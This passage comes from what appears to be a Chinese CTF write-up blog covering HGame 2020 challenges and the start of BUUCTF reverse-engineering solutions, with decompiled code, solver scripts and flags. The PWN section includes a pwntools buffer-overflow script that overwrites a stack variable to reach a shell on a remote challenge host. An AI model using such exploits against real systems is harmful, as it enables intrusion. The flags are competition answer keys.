print(np.dot(a,b))c = np.array([[26727, 24941, 101], [29285, 26995, 29551], [29551, 25953, 29561]])flag = &#39;&#39;d = np.dot(c, b)for i in range(3):    for j in range(3):        flag += str(int(d.item(i, j))) + &#39;_&#39;flag = &#39;hgame{&#39; + flag[:-1] + &#39;}&#39;print(flag)</code></pre><p>提交提示成功，猜测正确</p><pre><code class="flag">hgame{-24840_-78193_51567_2556_-26463_26729_3608_-25933_25943}</code></pre><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h4><p>IDA反编译</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  char s; // [esp+0h] [ebp-ACh]  char v5; // [esp+7Bh] [ebp-31h]  unsigned int v6; // [esp+A0h] [ebp-Ch]  int *v7; // [esp+A4h] [ebp-8h]  v7 = &amp;argc;  v6 = __readgsdword(0x14u);  alarm(8u);  setbuf(_bss_start, 0);  memset(&amp;s, 0, 0xA0u);  puts(&quot;Let&#39;s 0O0o\\0O0!&quot;);  gets(&amp;s);  if ( !memcmp(&quot;0O0o&quot;, &amp;v5, 7u) )    backdoor();  return 0;}//backdoorint backdoor(){  return system(&quot;/bin/sh&quot;);}</code></pre><p>所以最终的目标是运行backdoor()，所以只需要进入if分支就可以了，即v5和前面的字符串相等，自然想到输入s覆盖v5的值，不过需要注意的是，memcmp函数比较了7位，所以还要找到后面的几个字节，形成payload</p><pre><code class="python">from pwn import *io = remote(&quot;47.103.214.163&quot;,&quot;20000&quot;)#io=process(&quot;./Hard_AAAAA&quot;)io.recvuntil(&quot;Let&#39;s 0O0o\\0O0!&quot;)payload=&#39;a&#39;*123+&#39;0O0o\0O0&#39;io.sendline(payload)io.interactive()</code></pre><p>最终得到flag：</p><pre><code class="flag">hgame{0OoO0oo0O0Oo}</code></pre><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h4><p>简单的RSA解密，p和q都已经分解出来了，其它的没什么难度</p><pre><code class="python">#-*- coding:utf-8 -*-def gcdext(a, b):    &quot;&quot;&quot;    a: 模的取值    b: 想求逆的值    &quot;&quot;&quot;    if b == 0:        return 1, 0, a    x, y, gcd = gcdext(b, a % b)    return y, x - a // b * y, gcdc = 275698465082361070145173688411496311542172902608559859019841p = 681782737450022065655472455411q = 675274897132088253519831953441e = 13n = p * q# print(k)fai = (p - 1) * (q - 1)(d, k, g) = gcdext(e, fai)# print(fai)# print(k)# print(m)m = pow(c, d, n)# print(m)f = m.to_bytes(22, byteorder=&#39;big&#39;)print(f)</code></pre><p>直接求解出来flag</p><pre><code class="flag">hgame{t3Xt6O0k_R5A!!!}</code></pre><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h4><p>首先看到一长串似曾相识的东西</p><pre><code>Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</code></pre><p>像是摩斯电码base64加密之后的东西</p><p>所以base64解码之后</p><pre><code class="morse">.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--</code></pre><p>果然是摩斯电码，然后解摩斯电码</p><pre><code class="python">#-*- coding:utf-8 -*-CODE = {&#39;A&#39;: &#39;.-&#39;, &#39;B&#39;: &#39;-...&#39;, &#39;C&#39;: &#39;-.-.&#39;,        &#39;D&#39;: &#39;-..&#39;, &#39;E&#39;: &#39;.&#39;, &#39;F&#39;: &#39;..-.&#39;,        &#39;G&#39;: &#39;--.&#39;, &#39;H&#39;: &#39;....&#39;, &#39;I&#39;: &#39;..&#39;,        &#39;J&#39;: &#39;.---&#39;, &#39;K&#39;: &#39;-.-&#39;, &#39;L&#39;: &#39;.-..&#39;,        &#39;M&#39;: &#39;--&#39;, &#39;N&#39;: &#39;-.&#39;, &#39;O&#39;: &#39;---&#39;,        &#39;P&#39;: &#39;.--.&#39;, &#39;Q&#39;: &#39;--.-&#39;, &#39;R&#39;: &#39;.-.&#39;,        &#39;S&#39;: &#39;...&#39;, &#39;T&#39;: &#39;-&#39;, &#39;U&#39;: &#39;..-&#39;,        &#39;V&#39;: &#39;...-&#39;, &#39;W&#39;: &#39;.--&#39;, &#39;X&#39;: &#39;-..-&#39;,        &#39;Y&#39;: &#39;-.--&#39;, &#39;Z&#39;: &#39;--..&#39;,        &#39;0&#39;: &#39;-----&#39;, &#39;1&#39;: &#39;.----&#39;, &#39;2&#39;: &#39;..---&#39;,        &#39;3&#39;: &#39;...--&#39;, &#39;4&#39;: &#39;....-&#39;, &#39;5&#39;: &#39;.....&#39;,        &#39;6&#39;: &#39;-....&#39;, &#39;7&#39;: &#39;--...&#39;, &#39;8&#39;: &#39;---..&#39;,        &#39;9&#39;: &#39;----.&#39;,        &#39;.&#39;: &#39;.-.-.-&#39;, &#39;:&#39;: &#39;---...&#39;, &#39;,&#39;: &#39;--..--&#39;, &#39;;&#39;: &#39;-.-.-.&#39;,        &#39;?&#39;: &#39;..--..&#39;, &#39;=&#39;: &#39;-...-&#39;, &#39;\&#39;&#39;: &#39;.----.&#39;, &#39;/&#39;: &#39;-..-.&#39;,        &#39;!&#39;: &#39;-.-.--&#39;, &#39;-&#39;: &#39;-....-&#39;, &#39;_&#39;: &#39;..--.-&#39;, &#39;&quot;&#39;: &#39;.-..-.&#39;,        &#39;(&#39;: &#39;-.--.&#39;, &#39;)&#39;: &#39;-.--.-&#39;, &#39;$&#39;: &#39;...-..-&#39;, &#39;&amp;&#39;: &#39;.-...&#39;,        &#39;@&#39;: &#39;.--.-.&#39;        }def Decode(str):    Decode_value = CODE.keys()    Decode_key = CODE.values()    Decode_dict = dict(zip(Decode_key, Decode_value))    text = &#39;&#39;    msg = str.split(&#39; &#39;)    for s in msg:        if s in Decode_dict.keys():            text += Decode_dict[s]    return textprint(Decode(&#39;.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--&#39;))</code></pre><p>这里还有符号的摩斯电码，大部分的在线解码都没有，所以自己写了一个，解码出来补上hgame：</p><pre><code class="flag">hgame{W3LC0ME_TO_2020_HGAM3}</code></pre><h4 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h4><p>下载解压，是张图片，自然想到隐写，binwalk跑出来，发现是个压缩包，打开压缩包，发现需要密码，密码是这张照片在P站的ID，P站未知原因打不开，上B站找到了ID：76953815</p><p>解压出来打开flag.txt，内容如下：</p><pre><code>\u68\u67\u61\u6d\u65\u7b\u44\u6f\u5f\u79\u30\u75\u5f\u4b\u6e\u4f\u57\u5f\u75\u4e\u69\u43\u30\u64\u33\u3f\u7d</code></pre><p>unicode编码，解码得：</p><pre><code class="flag">hgame{Do_y0u_KnOW_uNiC0d3?}</code></pre><h4 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h4><p>压缩包打开，有一个密码提示和一个新的压缩包，Password.txt得内容如下：</p><pre><code>Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y   h jnsxf qjFjf jnb  rg fiyykwtbsnkm tm  xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.JRFVJYFZVRUAGMAI* Three fences first, Five Caesar next. English sentense first,  zip password next.</code></pre><p>根据提示，把上面的内容用3个字符得栅栏密码和5个字符得凯撒密码解密，得到一段英文和压缩包的密码</p><pre><code>Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice.EAVMUBAQHQMVEPDT</code></pre><p>解压出来得到一个新的txt文件，里面是莫名其妙的Ook语言,用在线工具翻译为text，得到一段base32编码大的字符串，base32解密之后得到了又一串编码过的字符，试一试base64，发现解码出来的内容有很多乱码，不过是PNG开头，应该是base64转图片，写个python脚本解码，得到一个二维码，扫码得到flag</p><pre><code class="flag">hgame{3Nc0dInG_@lL_iN_0Ne!}</code></pre><p>这题有各种各样的编码，还不错</p><h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="RE-1"><a href="#RE-1" class="headerlink" title="RE"></a>RE</h3><h4 id="unpack"><a href="#unpack" class="headerlink" title="unpack"></a>unpack</h4><p>明显upx脱壳，但是经过了万恶的出题人修改，不能用工具，只能手动脱壳<br>由于是linux可执行文件，PE常用的工具都没法用，只能开虚拟机用IDA远程调试，主要目的还是找到OEP，并且由于是linux程序，还省去了重建输入表的麻烦，直接就可以运行（虽然运不运行并不是很重要，主要是脱壳之后反编译出来）<br>脱壳的过程借鉴<a href="https://www.52pojie.cn/thread-1048649-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1048649-1-1.html</a><br>很少有人对ELF64文件加壳，教程也很少，直接使用里面的idc修改目录导出</p><pre><code class="c++">#include &lt;idc.idc&gt;#define PT_LOAD              1#define PT_DYNAMIC           2static main(void){  auto ImageBase,StartImg,EndImg;  auto e_phoff;  auto e_phnum,p_offset;  auto i,dumpfile;  ImageBase=0x400000;  StartImg=0x400000;  EndImg=0x0;  if (Dword(ImageBase)==0x7f454c46 || Dword(ImageBase)==0x464c457f )  {    if(dumpfile=fopen(&quot;D:\\dumpfile&quot;,&quot;wb&quot;))    {      e_phoff=ImageBase+Qword(ImageBase+0x20);      Message(&quot;e_phoff = 0x%x\n&quot;, e_phoff);      e_phnum=Word(ImageBase+0x38);      Message(&quot;e_phnum = 0x%x\n&quot;, e_phnum);      for(i=0;i&lt;e_phnum;i++)      {         if (Dword(e_phoff)==PT_LOAD || Dword(e_phoff)==PT_DYNAMIC)         {             p_offset=Qword(e_phoff+0x8);            StartImg=Qword(e_phoff+0x10);            EndImg=StartImg+Qword(e_phoff+0x28);            Message(&quot;start = 0x%x, end = 0x%x, offset = 0x%x\n&quot;, StartImg, EndImg, p_offset);            dump(dumpfile,StartImg,EndImg,p_offset);            Message(&quot;dump segment %d ok.\n&quot;,i);         }             e_phoff=e_phoff+0x38;      }      fseek(dumpfile,0x3c,0);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fseek(dumpfile,0x28,0);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fputc(0x00,dumpfile);      fclose(dumpfile);    }else Message(&quot;dump err.&quot;);  }}static dump(dumpfile,startimg,endimg,offset) {  auto i;  auto size;  size=endimg-startimg;  fseek(dumpfile,offset,0);  for ( i=0; i &lt; size; i=i+1 )   {    fputc(Byte(startimg+i),dumpfile);  }}</code></pre><p>尝试在虚拟机里面运行，发现可以运行，代表脱壳成功，反编译，通过提示语找到程序处理输入的部分</p><pre><code class="c++">scanf((__int64)&quot;%42s&quot;, v7);  v5 = 0;  for ( i = 0; i &lt;= 41; ++i )  {    if ( i + v7[i] != (unsigned __int8)byte_6CA0A0[i] )      v5 = 1;  }  if ( v5 == 1 )  {    v0 = &quot;Wrong input&quot;;    printf(&quot;Wrong input&quot;, v7);  }  else  {    v0 = &quot;Congratulations! Flag is your input&quot;;    printf(&quot;Congratulations! Flag is your input&quot;, v7);  }</code></pre><p>本题主要考验手动脱壳的技巧，对于加密部分并没有设置太多的难度，直接导出6CA0A0处的数组然后进行逆变换就得到了flag</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() {    unsigned char ida_chars[] =            {                    0x68, 0x68, 0x63, 0x70, 0x69, 0x80, 0x5B, 0x75, 0x78, 0x49,                    0x6D, 0x76, 0x75, 0x7B, 0x75, 0x6E, 0x41, 0x84, 0x71, 0x65,                    0x44, 0x82, 0x4A, 0x85, 0x8C, 0x82, 0x7D, 0x7A, 0x82, 0x4D,                    0x90, 0x7E, 0x92, 0x54, 0x98, 0x88, 0x96, 0x98, 0x57, 0x95,                    0x8F, 0xA6            };    string flag;    for(int i=0;i&lt;42;i++)        {            flag+=ida_chars[i]-i;        }    cout&lt;&lt;flag&lt;&lt;endl;    return 0;}</code></pre><p>最后输出flag</p><pre><code>hgame{Unp@cking_1s_R0m4ntic_f0r_r3vers1ng}</code></pre><h4 id="Classic-CrackMe"><a href="#Classic-CrackMe" class="headerlink" title="Classic_CrackMe"></a>Classic_CrackMe</h4><p>PEiD查看一下，没壳，编写语言是Microsoft Visual C# / Basic .NET，C#逆向没有难度，</p><p>dnSpy打开就和源码几乎没什么区别，这题显然难度不在这，反编译之后找到按键click事件，关键代码就在这里</p><pre><code class="c#">private void button1_Click(object sender, EventArgs e)        {            if (this.status == 1)            {                MessageBox.Show(&quot;你已经激活成功啦，快去提交flag吧~~~&quot;);                return;            }            string text = this.textBox1.Text;            if (text.Length != 46 || text.IndexOf(&quot;hgame{&quot;) != 0 || text.IndexOf(&quot;}&quot;) != 45)            {                MessageBox.Show(&quot;Illegal format&quot;);                return;            }            string base64iv = text.Substring(6, 24);            string str = text.Substring(30, 15);            try            {                Aes aes = new Aes(&quot;SGc0bTNfMm8yMF9XZWVLMg==&quot;, base64iv);                Aes aes2 = new Aes(&quot;SGc0bTNfMm8yMF9XZWVLMg==&quot;, &quot;MFB1T2g5SWxYMDU0SWN0cw==&quot;);                string text2 = aes.DecryptFromBase64String(&quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;);                if (text2.Equals(&quot;Same_ciphertext_&quot;))                {                    byte[] array = new byte[16];                    Array.Copy(aes2.EncryptToByte(text2 + str), 16, array, 0, 16);                    if (Convert.ToBase64String(array).Equals(&quot;dJntSWSPWbWocAq4yjBP5Q==&quot;))                    {                        MessageBox.Show(&quot;注册成功！&quot;);                        this.Text = &quot;已激活，欢迎使用！&quot;;                        this.status = 1;                    }                    else                    {                        MessageBox.Show(&quot;注册失败！\nhint: &quot; + aes2.DecryptFromBase64String(&quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;));                    }                }                else                {                    MessageBox.Show(&quot;注册失败！\nhint: &quot; + aes2.DecryptFromBase64String(&quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;));                }            }            catch            {                MessageBox.Show(&quot;注册失败！&quot;);            }        }</code></pre><p>发现最终考察的还是aes的cbc模式，我们输入的flag被掐头去尾分成了两部分，前一部分作为第一个aes实例的base64iv，第二段作为第二个实例的明文后半段，具体原理可以百度。</p><p>对于第一部分，每个key解密一组密文的结果是一样的只是iv不同，明文不同，所以只需要另找一组iv，求出这个解密之后的结果（解密出来的明文 xor FakeIV），然后在异或我们已知的明文就可以得到结果</p><p>对于第二部分，根据原理我们知道，后面的部分并不影响前面的加密结果，所以直接把一致的明文加密，然后再和已知的密文合并在一起，得到整体的一个密文，然后解密出来的后半部分就是我们需要的字符串。</p><p>不过这里需要注意几点，注意输入输出的数据类型，并且对于第二部分的处理要记得填充字符，因为第二部分只有15位，要填充到16位才能运算，一开始这里没注意，花了好长时间结果还是错的。</p><p>直接python解决：</p><pre><code class="python">from Crypto.Cipher import AESimport base64# 传入的key和iv都是bytes类型，加密输出的是经过base64编码之后的密文，解密传入的也是base64编码过后的密文class AesCrypter(object):    def __init__(self, key, iv):        self.key = key        self.iv = iv    def pkcs7padding(self, text):        bs = AES.block_size  # 16        length = len(text)        bytes_length = len(bytes(text, encoding=&#39;utf-8&#39;))        padding_size = length if (bytes_length == length) else bytes_length        padding = bs - padding_size % bs        padding_text = chr(padding) * padding        return text + padding_text    def pkcs7unpadding(self, text):        length = len(text)        unpadding = ord(text[length - 1])        return text[0:length - unpadding]    def encrypt(self, content):        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)        content_padding = self.pkcs7padding(content)        aes_encode_bytes = cipher.encrypt(bytes(content_padding, encoding=&#39;utf-8&#39;))        result = base64.b64encode(aes_encode_bytes).decode(encoding=&#39;utf-8&#39;)        return result    def decrypt(self, content):        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)        # base64解码        aes_encode_bytes = base64.b64decode(content)        # 解密        aes_decode_bytes = cipher.decrypt(aes_encode_bytes)        # 重新编码        result = aes_decode_bytes.decode(encoding=&#39;utf-8&#39;)        # 去除填充内容        result = self.pkcs7unpadding(result)        if result == None:            return &quot;&quot;        else:            return resultkey = base64.b64decode(&quot;SGc0bTNfMm8yMF9XZWVLMg==&quot;)fakeIV = base64.b64decode(&#39;MFB1T2g5SWxYMDU0SWN0cw==&#39;)plainText = &quot;Same_ciphertext_&quot;ciperText = &quot;mjdRqH4d1O8nbUYJk+wVu3AeE7ZtE9rtT/8BA8J897I=&quot;aesCipher = AesCrypter(key, fakeIV)fakePlainText = aesCipher.decrypt(ciperText)# print(fakePlainText)IV = &#39;&#39;for i in range(16):    IV += chr(ord(fakePlainText[i]) ^ fakeIV[i] ^ ord(plainText[i]))# print(&quot;IV : &quot; + IV)# /TyXYzPnY;$)\we_IV = base64.b64encode(IV.encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)cipherText2 = aesCipher.encrypt(plainText)cipherText2 = base64.b64decode(cipherText2).hex()[:32]cipherText3 = &#39;dJntSWSPWbWocAq4yjBP5Q==&#39;cipherText3 = base64.b64decode(cipherText3).hex()[:32]# print(cipherText2 + cipherText3)cipherText4 = bytes.fromhex(cipherText2 + cipherText3)cipherText4 = base64.b64encode(cipherText4)# print(cipherText4)plainText3 = aesCipher.decrypt(cipherText4)# print(plainText3)# Same_ciphertext_DiFfer3Nt_w0r1dflag = &#39;&#39;flag += &#39;hgame{&#39; + IV + plainText3[16:] + &#39;}&#39;print(flag)# hgame{L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d}</code></pre><p>最终的flag</p><pre><code>hgame{L1R5WFl6UG5ZOyQpXHdlXw==DiFfer3Nt_w0r1d}</code></pre><h4 id="babyPy"><a href="#babyPy" class="headerlink" title="babyPy"></a>babyPy</h4><p>这题比较简单，把log和dis指令表对照一下就能还原出来函数的原型来</p><p>dis指令表见<a href="https://docs.python.org/3/library/dis.html#python-bytecode-instructions" target="_blank" rel="noopener">https://docs.python.org/3/library/dis.html#python-bytecode-instructions</a></p><p>还原出来的函数原型（想打死命名的人）</p><pre><code class="python">def encrypt(OOo): O0O = OOo[::-1] O0o = list(O0O) for O0 in range(1, len(O0o)):     Oo = O0o[O0-1] ^ O0o[O0]     O0o[O0] = Oo O = bytes(O0o) return O.hex()</code></pre><p>所以只需要反过来异或一遍就可以了</p><pre><code class="python">s = bytes.fromhex(&#39;7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22&#39;)c = list(str)for i in range(len(c) - 1, 0, -1):    c[i] ^= c[i - 1]print(bytes(c[::-1]))</code></pre><p>输出flag</p><pre><code>hgame{sT4cK_1$_sO_e@Sy~~}</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
      <tag>re</tag>
      
      <tag>hgame</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF-re部分题解</title>
    <link href="/2020/01/11/BUUCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <url>/2020/01/11/BUUCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>看到有些大佬在做BUUCTF的题，看了一下，题目很多，但是感觉良莠不齐，并且开始的一些题目有些太简单了，就当是多做些题目了。</p><a id="more"></a><h4 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h4><p>确实非常easy，直接拖进IDA看到flag</p><pre><code class="flag">flag{this_Is_a_EaSyRe}</code></pre><h4 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h4><p>IDA打开，通过字符串窗口找到主程序，整个程序流程很简单</p><pre><code class="c++">for ( j = 0; ; ++j )  {    v8 = j;    v2 = j_strlen(Str2);    if ( v8 &gt; v2 )      break;    if ( Str2[j] == &#39;o&#39; )      Str2[j] = &#39;0&#39;;  }  sub_1400111D1(&quot;input the flag:&quot;);  sub_14001128F(&quot;%20s&quot;, &amp;Str1);  v3 = j_strlen(Str2);  if ( !strncmp(&amp;Str1, Str2, v3) )    sub_1400111D1(&quot;this is the right flag!\n&quot;);  else    sub_1400111D1(&quot;wrong flag\n&quot;);</code></pre><p>只有这一部分有用，str2时内存中的一个字符串，只是将输入的字符串和变换过后的str2进行一个简单的对比，一样则输出正确</p><p>str2的变换就是将所有的o变换成0，str2为‘{hello_world}’，所以flag为</p><pre><code class="flag">flag{hell0_w0rld}</code></pre><h4 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h4><p>和上一题完全一样，只不过时ELF64文件，把i和r全部替换成了1</p><pre><code class="flag">flag{hack1ng_fo1_fun}</code></pre><h4 id="helloworld"><a href="#helloworld" class="headerlink" title="helloworld"></a>helloworld</h4><p>安卓逆向，直接apktool反编译，在MainActivity.smail文件里找到了flag</p><pre><code class="flag">flag{7631a988259a00816deda84afb29430a}</code></pre><h4 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h4><p>简单加壳软件，在加壳时没做任何的修改，直接upx脱壳，IDA反编译，通过字符串直接找到flag</p><pre><code>flag{HappyNewYear!}</code></pre><h4 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h4><p>IDA反编译可以直接发现flag，把花括号里的放进flag{}里即可</p><pre><code>flag{49d3c93df25caad81232130f3d2ebfad}</code></pre><h4 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h4><p>一看题目就是到要逆运算异或，反编译之后发现关键运算</p><pre><code class="c++">for ( i = 1; i &lt; 33; ++i )    v6[i] ^= v6[i - 1];  v3 = global;  if ( !strncmp(v6, global, 0x21uLL) )    printf(&quot;Success&quot;, v3);</code></pre><p>所以逆运算就好了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() {    unsigned char ida_chars[] =            {                    0x66, 0x0A, 0x6B, 0x0C, 0x77, 0x26, 0x4F, 0x2E, 0x40, 0x11,                    0x78, 0x0D, 0x5A, 0x3B, 0x55, 0x11, 0x70, 0x19, 0x46, 0x1F,                    0x76, 0x22, 0x4D, 0x23, 0x44, 0x0E, 0x67, 0x06, 0x68, 0x0F,                    0x47, 0x32, 0x4F            };    string flag;    flag+=ida_chars[0];    for(int i=1;i&lt;33;i++)        {            flag+=(ida_chars[i]^ida_chars[i-1]);        }    cout&lt;&lt;flag&lt;&lt;endl;    return 0;}</code></pre><p>直接输出flag</p><pre><code>flag{QianQiuWanDai_YiTongJiangHu}</code></pre><h4 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h4><p>和bugku的love是同一个题，不再赘述</p><h4 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h4><p>比较简单的的迷宫题，上下左右全部都标示的清清楚楚</p><p><img src="https://s2.ax1x.com/2020/02/13/1q9kRI.png" srcset="/img/loading.gif" alt="不一样的flag-1"></p><p>迷宫如下图</p><p><img src="https://s2.ax1x.com/2020/02/13/1q9Azt.png" srcset="/img/loading.gif" alt="不一样的flag-2"></p><pre><code>*11110100001010000101111#</code></pre><p>转换成5*5的方阵，*走到#即可</p><pre><code>flag{222441144222}</code></pre><h4 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h4><p>IDA反编译出来，发现需要输入8位，经过sub_4010F0这个函数的变换后，在经过两个base64变换（查看函数内部自己发现），满足条件即正确</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpTZF.png" srcset="/img/loading.gif" alt="刮开有奖-1"></p><p>sub_4010F0这个函数内容比较多，但是和输入的字符串无关，所以直接直接把函数实现然后求出来正确的取值就可以了（后面的条件略多，这里的变换实际上只需要第一位和第五位）</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int __cdecl decrypt(char *a1, int a2, int a3) {    int result; // eax    int i; // esi    int v5; // ecx    int v6; // edx    result = a3;    for (i = a2; i &lt;= a3; a2 = i) {        v5 = i;        v6 = a1[i];        if (a2 &lt; result &amp;&amp; i &lt; result) {            do {                if (v6 &gt; a1[result]) {                    if (i &gt;= result)                        break;                    ++i;                    a1[v5] = a1[result];                    if (i &gt;= result)                        break;                    while (a1[result] &lt;= v6) {                        if (++i &gt;= result)                            goto LABEL_13;                    }                    if (i &gt;= result)                        break;                    v5 = i;                    a1[result] = a1[i];                }                --result;            } while (i &lt; result);        }        LABEL_13:        a1[result] = v6;        decrypt(a1, a2, i - 1);        result = a3;        ++i;    }    return result;}char v9[20] = {90, 74, 83, 69, 67, 97, 78, 72, 51, 110, 103};int main() {    cout &lt;&lt; v9 &lt;&lt; endl;    decrypt(v9, 0, 10);    cout &lt;&lt; v9 &lt;&lt; endl;    return 0;}</code></pre><p>输出如图所示</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpIqU.png" srcset="/img/loading.gif" alt="刮开有奖-2"></p><p>接着分析下面的部分</p><pre><code class="c++">if ( String == v9 + 34         // 第一位等于51+34=85--&gt;&#39;U&#39;        &amp;&amp; v21 == v13         //第2位，等于v13,即sub_4010F0函数返回值的第5位值--&gt;&#39;J&#39;        &amp;&amp; 4 * v22 - 141 == 3 * v11        &amp;&amp; v23 / 4 == 2 * (v16 / 9)        &amp;&amp; !strcmp(v6, &quot;ak1w&quot;)       // 第6,7,8个字符base64之后，等于ak1w        &amp;&amp; !strcmp(v7,&quot;V1Ax&quot;)        // 第3,4,5个字符，base64之后等于V1Ax   )      {        MessageBoxA(hDlg, &quot;U g3t 1T!&quot;, &quot;@_@&quot;, 0);      }</code></pre><p>还多了两个条件就检验正确就可以了</p><p>得到flag</p><pre><code>flag{UJWP1jMp}</code></pre><h4 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h4><p>这题没什么难度，IDA打开</p><pre><code class="c++">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  int v3; // eax  char v4; // [rsp+Fh] [rbp-1h]  while ( 1 )  {    while ( 1 )    {      printf(&quot;Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: &quot;, argv, envp);      v4 = getchar();      if ( v4 != &#39;d&#39; &amp;&amp; v4 != &#39;D&#39; )        break;      Decry();    }    if ( v4 == &#39;q&#39; || v4 == &#39;Q&#39; )      Exit();    puts(&quot;Input fault format!&quot;);    v3 = getchar();    putchar(v3);  }}</code></pre><p>main函数里面没有什么需要注意的东西，解决问题的重点就都放在Decry()这个函数里了</p><pre><code class="c++">unsigned __int64 Decry(){  char v1; // [rsp+Fh] [rbp-51h]  int v2; // [rsp+10h] [rbp-50h]  int v3; // [rsp+14h] [rbp-4Ch]  int i; // [rsp+18h] [rbp-48h]  int v5; // [rsp+1Ch] [rbp-44h]  char src[8]; // [rsp+20h] [rbp-40h]  __int64 v7; // [rsp+28h] [rbp-38h]  int v8; // [rsp+30h] [rbp-30h]  __int64 v9; // [rsp+40h] [rbp-20h]  __int64 v10; // [rsp+48h] [rbp-18h]  int v11; // [rsp+50h] [rbp-10h]  unsigned __int64 v12; // [rsp+58h] [rbp-8h]  v12 = __readfsqword(0x28u);  *(_QWORD *)src = &#39;SLCDN&#39;;  v7 = 0LL;  v8 = 0;  v9 = &#39;wodah&#39;;  v10 = 0LL;  v11 = 0;  text = join(key3, (const char *)&amp;v9);         // text=killshadow  strcpy(key, key1);                            // key=key1=&#39;ADSFK&#39;  strcat(key, src);                             // key=&#39;ADSFKNDCLS&#39;  v2 = 0;  v3 = 0;  getchar();  v5 = strlen(key);  for ( i = 0; i &lt; v5; ++i )  {    if ( key[v3 % v5] &gt; &#39;@&#39; &amp;&amp; key[v3 % v5] &lt;= &#39;Z&#39; )      key[i] = key[v3 % v5] + 32;    ++v3;  }                                             // 转换为小写                                                // key=&#39;adsfkndcls&#39;  printf(&quot;Please input your flag:&quot;, src);  while ( 1 )  {    v1 = getchar();    if ( v1 == &#39;\n&#39; )                           // 遇到回车结束      break;    if ( v1 == &#39; &#39; )                            // 跳过空格    {      ++v2;    }    else    {      if ( v1 &lt;= 96 || v1 &gt; 122 )      {        if ( v1 &gt; 64 &amp;&amp; v1 &lt;= 90 )              // 大写字母          str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97;      }      else                                      // 小写字母      {        str2[v2] = (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97;      }      if ( !(v3 % v5) )        putchar(32);      ++v2;    }  }  if ( !strcmp(text, str2) )    puts(&quot;Congratulation!\n&quot;);  else    puts(&quot;Try again!\n&quot;);  return __readfsqword(0x28u) ^ v12;}</code></pre><p>需要注意src和v9本身是以long long类型赋值，转换成字符串要记得逆序，接下来的过程就很简单了，程序的过程很清楚，直接逆向运算就可以算出来结果了</p><pre><code class="c++">#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main(void) {    int n = 0, v5 = 10, v3 = 10, v2 = 0;    char v1;    char flag[11] = {0};    char key[] = 